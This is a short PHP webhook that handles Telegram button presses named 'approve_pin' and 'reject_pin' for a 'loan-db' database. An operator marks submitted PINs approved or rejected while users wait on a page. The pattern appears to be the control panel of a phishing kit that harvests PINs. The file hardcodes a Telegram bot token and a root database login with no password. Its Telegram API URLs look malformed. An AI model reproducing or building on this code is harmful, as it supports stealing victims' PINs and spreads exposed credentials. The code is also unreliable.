<?php
// Optional: connect to database if you want to track approval
$host = "localhost";
$user = "root";
$password = "";
$database = "loan-db";
$conn = new mysqli($host, $user, $password, $database);
if ($conn->connect_error) { die("Connection failed: " . $conn->connect_error); }

$update = json_decode(file_get_contents("php://input"), true);

if(isset($update['callback_query'])){
    $data = $update['callback_query']['data'];
    $chatId = $update['callback_query']['message']['chat']['id'];
    $messageId = $update['callback_query']['message']['message_id'];

    if($data == 'approve_pin'){
        // Update DB if needed
        file_get_contents("https://api.telegram.org/8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8/editMessageText?chat_id=$chatId&message_id=$messageId&text=✅ Approved");
        // Optionally mark user as approved in database
    }

    if($data == 'reject_pin'){
        file_get_contents("https://api.telegram.org/8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8/editMessageText?chat_id=$chatId&message_id=$messageId&text=❌ Rejected");
        // Optionally mark user as rejected in database
        // You can redirect user to re-enter data if your waiting page checks DB status
    }
}
?>